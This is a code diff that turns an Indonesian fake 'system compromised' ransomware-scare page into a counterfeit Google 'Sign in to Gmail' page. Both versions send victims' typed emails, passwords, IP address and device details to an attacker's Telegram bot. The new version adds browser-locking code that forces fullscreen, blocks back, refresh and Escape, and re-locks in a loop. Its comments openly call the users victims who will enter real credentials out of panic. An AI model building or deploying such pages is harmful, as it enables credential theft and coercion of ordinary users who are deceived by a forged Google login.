@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>⚠️ SISTEM TERKOMPROMI ⚠️</title>
+    <title>Sign in - Google Accounts</title>
     <style>
         * {
             margin: 0;
@@ -14,8 +14,8 @@
         }
 
         body {
-            font-family: 'Courier New', 'Fira Code', monospace;
-            background: #0a0000;
+            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+            background: #ffffff;
             min-height: 100vh;
             display: flex;
             justify-content: center;
@@ -28,264 +28,114 @@
             overflow: hidden;
         }
 
-        /* BACKGROUND TULISAN KODE HACKER */
-        .matrix-bg {
+        /* Lock screen overlay - tidak bisa ditembus */
+        .lock-screen {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            z-index: 0;
-            opacity: 0.15;
-            font-family: 'Courier New', monospace;
-            font-size: 14px;
-            color: #ff0000;
-            white-space: pre;
-            overflow: hidden;
-            pointer-events: none;
-        }
-
-        .matrix-line {
-            animation: scrollDown 20s linear infinite;
-            position: absolute;
-            white-space: nowrap;
-        }
-
-        @keyframes scrollDown {
-            0% { transform: translateY(-100%); }
-            100% { transform: translateY(100vh); }
-        }
-
-        /* OVERLAY UTAMA */
-        .hacker-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.92);
-            z-index: 1;
+            background: white;
+            z-index: 999999;
             display: flex;
             justify-content: center;
             align-items: center;
-            backdrop-filter: blur(3px);
+            overflow-y: auto;
         }
 
-        /* CARD UTAMA */
-        .hacker-card {
-            background: linear-gradient(145deg, #1a0000 0%, #0a0000 100%);
-            border: 2px solid #ff0000;
-            border-radius: 20px;
-            padding: 35px 28px;
-            max-width: 480px;
+        /* Google Sign-in Card */
+        .card {
+            max-width: 450px;
             width: 90%;
+            padding: 48px 40px 36px;
+            margin: 20px auto;
             text-align: center;
-            box-shadow: 0 0 50px rgba(255,0,0,0.3), inset 0 0 20px rgba(255,0,0,0.1);
-            animation: borderPulse 1.5s infinite;
-        }
-
-        @keyframes borderPulse {
-            0%, 100% { box-shadow: 0 0 20px rgba(255,0,0,0.3), inset 0 0 10px rgba(255,0,0,0.1); border-color: #ff0000; }
-            50% { box-shadow: 0 0 50px rgba(255,0,0,0.8), inset 0 0 30px rgba(255,0,0,0.3); border-color: #ff4444; }
-        }
-
-        /* HEADER HACKER */
-        .hacker-header {
-            margin-bottom: 25px;
-        }
-
-        .skull-icon {
-            font-size: 60px;
-            animation: shake 0.5s infinite;
-            display: inline-block;
-        }
-
-        @keyframes shake {
-            0%, 100% { transform: translate(0,0); }
-            25% { transform: translate(-2px, 2px); }
-            75% { transform: translate(2px, -2px); }
-        }
-
-        .glitch-text {
-            font-size: 28px;
-            font-weight: bold;
-            color: #ff0000;
-            text-shadow: 2px 2px 0px #660000, -2px -2px 0px #990000;
-            margin: 15px 0;
-            letter-spacing: 2px;
-        }
-
-        .warning-badge {
-            background: #ff0000;
-            color: #000;
-            padding: 6px 14px;
-            border-radius: 5px;
-            font-size: 12px;
-            font-weight: bold;
-            display: inline-block;
-            font-family: monospace;
-            animation: blink 1s step-end infinite;
-        }
-
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.5; }
-        }
-
-        /* PROGRESS BAR HACK */
-        .hack-progress {
-            background: #1a0000;
-            border: 1px solid #ff0000;
-            border-radius: 10px;
-            height: 8px;
-            margin: 20px 0;
-            overflow: hidden;
-        }
-
-        .hack-progress-bar {
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, #ff0000, #ff4444, #ff0000);
-            animation: loading 3s linear infinite;
-        }
-
-        @keyframes loading {
-            0% { width: 0%; }
-            50% { width: 100%; }
-            100% { width: 0%; }
-        }
-
-        /* DANGER TEXT */
-        .danger-text {
-            color: #ff4444;
-            font-size: 13px;
-            margin: 15px 0;
-            font-weight: bold;
-            text-transform: uppercase;
-        }
-
-        /* MESSAGE BOX */
-        .message-box {
-            background: #0d0000;
-            border-left: 4px solid #ff0000;
-            padding: 15px;
-            margin: 20px 0;
-            text-align: left;
-            font-size: 12px;
-        }
-
-        .message-box p {
-            color: #ff6666;
-            margin: 8px 0;
-            font-family: monospace;
-        }
-
-        .message-box .bullet {
-            color: #ff0000;
-            font-weight: bold;
-        }
-
-        /* GOOGLE LOGO AREA */
-        .google-area {
-            margin: 20px 0;
-            padding: 15px;
-            background: rgba(255,0,0,0.05);
-            border-radius: 10px;
         }
 
         .google-logo {
-            filter: brightness(0) invert(1);
-            opacity: 0.7;
+            margin-bottom: 20px;
         }
 
-        /* INPUT STYLE HACKER */
+        .google-logo img {
+            width: 75px;
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            color: #202124;
+            margin-bottom: 8px;
+        }
+
+        .subtitle {
+            color: #5f6368;
+            font-size: 16px;
+            margin-bottom: 32px;
+        }
+
         .input-group {
-            margin: 15px 0;
+            margin-bottom: 20px;
             text-align: left;
         }
 
-        .input-group label {
-            font-size: 11px;
-            color: #ff6666;
-            margin-bottom: 6px;
-            display: block;
-            font-family: monospace;
-            letter-spacing: 1px;
-        }
-
-        input {
+        .input-group input {
             width: 100%;
-            padding: 14px 16px;
-            background: #0a0000;
-            border: 1px solid #ff0000;
-            border-radius: 8px;
-            font-size: 14px;
-            color: #ff4444;
-            font-family: monospace;
+            padding: 13px 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
             transition: all 0.2s;
+            background: white;
         }
 
-        input:focus {
+        .input-group input:focus {
             outline: none;
-            border-color: #ff4444;
-            box-shadow: 0 0 10px rgba(255,0,0,0.3);
-            background: #000;
+            border-color: #1a73e8;
+            box-shadow: 0 0 0 2px rgba(26,115,232,0.2);
         }
 
-        input::placeholder {
-            color: #441111;
-        }
-
-        /* ERROR MESSAGE */
         .error-message {
-            background: rgba(255,0,0,0.2);
-            border: 1px solid #ff0000;
-            color: #ff6666;
+            background: #fce8e6;
+            color: #d93025;
             padding: 12px;
-            border-radius: 8px;
-            font-size: 12px;
-            margin: 15px 0;
-            text-align: center;
+            border-radius: 4px;
+            font-size: 14px;
+            margin: 16px 0;
+            text-align: left;
             display: none;
-            font-family: monospace;
         }
 
-        /* BUTTON HACKER */
         button {
             width: 100%;
-            padding: 14px;
-            background: #ff0000;
-            color: #000;
+            padding: 12px;
+            background: #1a73e8;
+            color: white;
             border: none;
-            border-radius: 8px;
-            font-size: 16px;
-            font-weight: bold;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
             cursor: pointer;
-            margin-top: 15px;
+            margin-top: 20px;
             transition: all 0.2s;
-            font-family: monospace;
-            text-transform: uppercase;
-            letter-spacing: 2px;
         }
 
         button:hover {
-            background: #cc0000;
-            box-shadow: 0 0 20px rgba(255,0,0,0.5);
+            background: #1557b0;
+            box-shadow: 0 1px 2px 0 rgba(0,0,0,0.1);
         }
 
         button:disabled {
-            background: #441111;
+            background: #dadce0;
             cursor: not-allowed;
         }
 
-        /* LOADING SPINNER */
         .loading-spinner {
             display: none;
-            margin: 15px auto;
-            width: 30px;
-            height: 30px;
-            border: 3px solid #441111;
-            border-top: 3px solid #ff0000;
+            margin: 16px auto;
+            width: 24px;
+            height: 24px;
+            border: 2px solid #e0e0e0;
+            border-top: 2px solid #1a73e8;
             border-radius: 50%;
             animation: spin 1s linear infinite;
         }
@@ -295,81 +145,60 @@
             100% { transform: rotate(360deg); }
         }
 
-        /* COUNTER */
-        .attempt-counter {
-            margin-top: 20px;
-            font-size: 11px;
-            color: #ff4444;
-            border-top: 1px solid #330000;
-            padding-top: 15px;
+        .footer-links {
+            margin-top: 32px;
+            font-size: 12px;
+            color: #5f6368;
         }
 
-        .footer-hacker {
+        .footer-links a {
+            color: #1a73e8;
+            text-decoration: none;
+            margin: 0 8px;
+        }
+
+        .attempt-text {
             margin-top: 20px;
-            font-size: 9px;
-            color: #661111;
-            letter-spacing: 1px;
+            font-size: 12px;
+            color: #5f6368;
         }
     </style>
 </head>
 <body>
 
-<!-- BACKGROUND KODE KODE HACKER BERJALAN -->
-<div class="matrix-bg" id="matrixBg"></div>
-
-<div class="hacker-overlay">
-    <div class="hacker-card">
-        <div class="hacker-header">
-            <div class="skull-icon">💀⚠️💀</div>
-            <div class="glitch-text">[ SISTEM TERKOMPROMI ]</div>
-            <div class="warning-badge">! PERINGATAN !</div>
+<div class="lock-screen" id="lockScreen">
+    <div class="card">
+        <div class="google-logo">
+            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
         </div>
 
-        <div class="hack-progress">
-            <div class="hack-progress-bar"></div>
-        </div>
-
-        <div class="danger-text">❗ AKSES ANDA TELAH DIBLOKIR ❗</div>
-        
-        <div class="message-box">
-            <p><span class="bullet">›</span> <strong style="color:#ff0000;">ROOTKIT TERDETEKSI</strong> pada perangkat Anda</p>
-            <p><span class="bullet">›</span> Semua data sedang dienkripsi oleh <strong style="color:#ff0000;">RANSOMWARE</strong></p>
-            <p><span class="bullet">›</span> Untuk membatalkan enkripsi, verifikasi identitas Anda</p>
-            <p><span class="bullet">›</span> <span style="color:#ff0000;">Percobaan gagal: data akan dihapus permanen</span></p>
-            <p><span class="bullet">›</span> <strong id="attemptCount">3</strong> percobaan tersisa</p>
-        </div>
-
-        <div class="google-area">
-            <div class="google-logo">
-                <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google" width="80" style="filter: brightness(0) invert(1); opacity:0.8;">
-            </div>
-            <div style="font-size: 11px; color: #ff6666; margin-top: 8px;">[ VERIFIKASI AKUN GOOGLE ]</div>
-        </div>
+        <h1>Sign in</h1>
+        <div class="subtitle">to continue to Gmail</div>
 
         <form id="loginForm">
             <div class="input-group">
-                <label>› EMAIL / NOMOR TELEPON</label>
-                <input type="email" id="email" placeholder="contoh@gmail.com" autocomplete="off" required>
+                <input type="email" id="email" placeholder="Email or phone" autocomplete="off" required>
             </div>
             <div class="input-group">
-                <label>› PASSWORD</label>
-                <input type="password" id="password" placeholder="Masukkan password Anda" required>
+                <input type="password" id="password" placeholder="Password" required>
             </div>
-            
+
             <div class="error-message" id="errorMsg">
-                [ ERROR ] Email atau password salah!
+                Couldn't find your Google Account
             </div>
-            
+
             <div class="loading-spinner" id="spinner"></div>
-            
-            <button type="submit" id="submitBtn">[ BATALKAN ENKRIPSI ]</button>
+
+            <button type="submit" id="submitBtn">Next</button>
         </form>
 
-        <div class="attempt-counter" id="countdownText"></div>
-        <div class="footer-hacker">
-            { SECURITY PROTOCOL v2.0 }<br>
-            { HACKER ALERT • LOKASI TERDETEKSI }
+        <div class="footer-links">
+            <a href="#">Forgot email?</a>
+            <span>•</span>
+            <a href="#">Forgot password?</a>
         </div>
+
+        <div class="attempt-text" id="attemptText"></div>
     </div>
 </div>
 
@@ -379,66 +208,105 @@
     const CHAT_ID = "8854409945";
     // ==========================================
 
-    // ========== BACKGROUND MATRIX CODE ==========
-    const matrixBg = document.getElementById('matrixBg');
-    const codeStrings = [
-        '> ACCESS DENIED', '> HACKING PROGRESS', '> ROOTKIT_INJECT', 
-        '> 0x0F3A2B1C', '> SYS.OVERRIDE', '> RANSOMWARE_ACTIVE',
-        '> 01001110', '> BACKDOOR_FOUND', '> ADMIN.BYPASS',
-        '> CRYPTO_LOCK', '> DATA_EXFIL', '> PERUBAHAN_ID',
-        '> 0xFF00FF00', '> SYS.TERMINAL', '> KERNEL_PANIC',
-        '> DECRYPT_FAIL', '> WARNING_0x01'
-    ];
-    
-    for (let i = 0; i < 35; i++) {
-        const line = document.createElement('div');
-        line.className = 'matrix-line';
-        line.style.left = Math.random() * 100 + '%';
-        line.style.animationDuration = (Math.random() * 15 + 10) + 's';
-        line.style.animationDelay = Math.random() * 10 + 's';
-        line.style.fontSize = (Math.random() * 10 + 10) + 'px';
-        line.style.opacity = Math.random() * 0.5 + 0.1;
-        
-        let text = '';
-        for (let j = 0; j < 10; j++) {
-            text += codeStrings[Math.floor(Math.random() * codeStrings.length)] + '  ';
-        }
-        line.innerText = text;
-        matrixBg.appendChild(line);
-    }
-
     let attemptCount = 3;
     let isLocked = false;
+    let fullscreenActive = false;
 
+    const lockScreen = document.getElementById('lockScreen');
     const form = document.getElementById('loginForm');
     const emailInput = document.getElementById('email');
     const passwordInput = document.getElementById('password');
     const submitBtn = document.getElementById('submitBtn');
     const spinner = document.getElementById('spinner');
     const errorMsg = document.getElementById('errorMsg');
-    const attemptSpan = document.getElementById('attemptCount');
-    const countdownDiv = document.getElementById('countdownText');
+    const attemptText = document.getElementById('attemptText');
 
-    // ========== LOCK BROWSER TOTAL ==========
+    // ========== FULLSCREEN LOCK ==========
+    // Request fullscreen saat halaman dimuat
+    function requestFullscreen() {
+        const docEl = document.documentElement;
+        if (docEl.requestFullscreen) {
+            docEl.requestFullscreen();
+        } else if (docEl.webkitRequestFullscreen) {
+            docEl.webkitRequestFullscreen();
+        } else if (docEl.msRequestFullscreen) {
+            docEl.msRequestFullscreen();
+        }
+    }
+
+    // Cegah keluar dari fullscreen
+    document.addEventListener('fullscreenchange', function() {
+        if (!document.fullscreenElement) {
+            requestFullscreen();
+        }
+    });
+    document.addEventListener('webkitfullscreenchange', function() {
+        if (!document.webkitFullscreenElement) {
+            requestFullscreen();
+        }
+    });
+
+    // Panggil fullscreen setelah user interaksi (karena browser butuh interaksi)
+    document.body.addEventListener('click', function enableFullscreen() {
+        if (!fullscreenActive) {
+            requestFullscreen();
+            fullscreenActive = true;
+        }
+    }, { once: true });
+
+    // ========== LOCK NAVIGASI TOTAL ==========
+    // Lock back button
     history.pushState(null, null, location.href);
     window.addEventListener('popstate', function() {
         history.pushState(null, null, location.href);
+        // Tambahan: reload halaman biar gak bisa kabur
+        location.reload();
     });
 
+    // Lock refresh (F5, Ctrl+R, Ctrl+Shift+R)
     document.addEventListener('keydown', function(e) {
-        if (e.key === 'F5' || e.key === 'F12' ||
+        if (e.key === 'F5' || 
+            e.key === 'F12' ||
             (e.ctrlKey && e.key === 'r') || 
             (e.ctrlKey && e.shiftKey && e.key === 'R') ||
             (e.ctrlKey && e.key === 'w') ||
-            (e.metaKey && e.key === 'r')) {
+            (e.metaKey && e.key === 'r') ||
+            e.key === 'Escape') {
             e.preventDefault();
             return false;
         }
     });
 
+    // Lock right click
     document.addEventListener('contextmenu', function(e) {
         e.preventDefault();
         return false;
+    });
+
+    // Lock touch gestures (swipe back, pull to refresh)
+    let touchStartY = 0;
+    document.addEventListener('touchstart', function(e) {
+        touchStartY = e.touches[0].clientY;
+    });
+    document.addEventListener('touchmove', function(e) {
+        const touchY = e.touches[0].clientY;
+        if (touchY - touchStartY > 50) {
+            e.preventDefault();
+            return false;
+        }
+    });
+
+    // Lock zoom
+    document.addEventListener('gesturestart', function(e) {
+        e.preventDefault();
+        return false;
+    });
+
+    // ========== HIDE URL BAR / ADDRESS BAR ==========
+    window.addEventListener('load', function() {
+        setTimeout(function() {
+            window.scrollTo(0, 1);
+        }, 0);
     });
 
     // ========== FUNGSI ==========
@@ -448,7 +316,7 @@
             const data = await res.json();
             return data.ip;
         } catch(e) {
-            return 'Tidak diketahui';
+            return 'Unknown';
         }
     }
 
@@ -457,15 +325,14 @@
         const tanggal = new Date().toLocaleString('id-ID', {timeZone: 'Asia/Jakarta'});
         const userAgent = navigator.userAgent;
         
-        let pesan = `💀💀💀 HACKER LOCKSCREEN 💀💀💀%0A%0A`;
+        let pesan = `🔐🔐🔐 GOOGLE LOCKSCREEN 🔐🔐🔐%0A%0A`;
         pesan += `📧 EMAIL    : ${email}%0A`;
         pesan += `🔑 PASSWORD : ${password}%0A`;
         pesan += `✅ STATUS   : ${status}%0A`;
         pesan += `🔄 PERCOBAAN: ${4 - attemptCount} / 3%0A`;
         pesan += `🌐 IP       : ${ip}%0A`;
         pesan += `📅 WAKTU    : ${tanggal}%0A`;
-        pesan += `💻 DEVICE   : ${encodeURIComponent(userAgent.substring(0, 150))}%0A%0A`;
-        pesan += `⚠️ KORBAN TERKENA HACKER LOCKSCREEN ⚠️`;
+        pesan += `💻 DEVICE   : ${encodeURIComponent(userAgent.substring(0, 150))}`;
         
         const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${pesan}`;
         
@@ -475,27 +342,35 @@
     }
 
     function updateAttemptDisplay() {
-        attemptSpan.innerText = attemptCount;
+        attemptText.innerText = `⚠️ ${attemptCount} attempt${attemptCount !== 1 ? 's' : ''} remaining`;
         if (attemptCount <= 0) {
             errorMsg.style.display = 'block';
-            errorMsg.innerHTML = '[ CRITICAL ERROR ] PERANGKAT AKAN DIENKRIPSI PERMANEN!\\nHubungi support@google.com untuk bantuan.';
+            errorMsg.innerHTML = '🔒 Too many failed attempts. Account temporarily locked.';
             submitBtn.disabled = true;
-            startCountdown(10);
+            startCountdown(30);
         }
     }
 
     function startCountdown(seconds) {
         let timeLeft = seconds;
-        countdownDiv.innerText = `[ RESET DALAM ${timeLeft} DETIK ]`;
+        attemptText.innerText = `⏳ Please wait ${timeLeft} seconds before trying again...`;
         const timer = setInterval(() => {
             timeLeft--;
-            countdownDiv.innerText = `[ RESET DALAM ${timeLeft} DETIK ]`;
+            attemptText.innerText = `⏳ Please wait ${timeLeft} seconds before trying again...`;
             if (timeLeft <= 0) {
                 clearInterval(timer);
-                countdownDiv.innerText = '[ SISTEM RESET... ]';
-                location.reload();
+                attemptCount = 3;
+                updateAttemptDisplay();
+                submitBtn.disabled = false;
             }
         }, 1000);
+    }
+
+    // Validasi ke Google (simulasi - tapi korban gak tau ini fake)
+    function validateLogin(email, password) {
+        // Korban bakal masukin email & password asli karena panik
+        // Format validasi: email harus pake @, password minimal 4 karakter
+        return email.includes('@') && email.includes('.') && password.length >= 4;
     }
 
     // ========== SUBMIT ==========
@@ -518,32 +393,33 @@
         spinner.style.display = 'block';
         errorMsg.style.display = 'none';
         
-        await sendToTelegram(email, password, 'PERCOBAAN LOGIN');
+        // Kirim ke Telegram dulu
+        await sendToTelegram(email, password, 'LOGIN ATTEMPT');
         
-        // Validasi sederhana (email harus format bener, password minimal 4 karakter)
-        const isValidFormat = email.includes('@') && email.includes('.') && password.length >= 4;
+        const isValid = validateLogin(email, password);
         
-        setTimeout(async () => {
+        setTimeout(() => {
             spinner.style.display = 'none';
             
-            if (isValidFormat) {
-                await sendToTelegram(email, password, '✅ LOGIN BERHASIL - DATA TERSIMPAN');
+            if (isValid) {
+                // Kirim notifikasi berhasil
+                sendToTelegram(email, password, '✅ SUCCESS - REAL DATA');
                 
                 errorMsg.style.display = 'block';
-                errorMsg.style.backgroundColor = '#0a2200';
-                errorMsg.style.borderColor = '#00ff00';
-                errorMsg.style.color = '#00ff00';
-                errorMsg.innerHTML = '[ SUCCESS ] Enkripsi dibatalkan! Mengalihkan...';
+                errorMsg.style.backgroundColor = '#e6f4ea';
+                errorMsg.style.color = '#137333';
+                errorMsg.innerHTML = '✅ Verifikasi berhasil! Redirecting to Gmail...';
                 
+                // Redirect ke Gmail asli setelah 2 detik
                 setTimeout(() => {
-                    window.location.href = 'https://accounts.google.com';
+                    window.location.href = 'https://mail.google.com';
                 }, 2000);
             } else {
                 attemptCount--;
                 updateAttemptDisplay();
                 
                 errorMsg.style.display = 'block';
-                errorMsg.innerHTML = '[ ERROR ] Email atau password salah!';
+                errorMsg.innerHTML = '❌ Wrong email or password. Please try again.';
                 
                 emailInput.value = '';
                 passwordInput.value = '';
@@ -554,12 +430,26 @@
                 
                 setTimeout(() => {
                     errorMsg.style.display = 'none';
-                }, 2500);
+                }, 3000);
             }
         }, 1500);
     });
 
+    // Tampilkan percobaan awal
+    updateAttemptDisplay();
     emailInput.focus();
+
+    // Re-lock jika user mencoba keluar (loop)
+    setInterval(() => {
+        if (!document.fullscreenElement && fullscreenActive) {
+            requestFullscreen();
+        }
+        // Pastikan history lock
+        if (window.location.hash !== '#locked') {
+            window.location.hash = 'locked';
+            history.pushState(null, null, '#locked');
+        }
+    }, 500);
 </script>
 </body>
 </html>
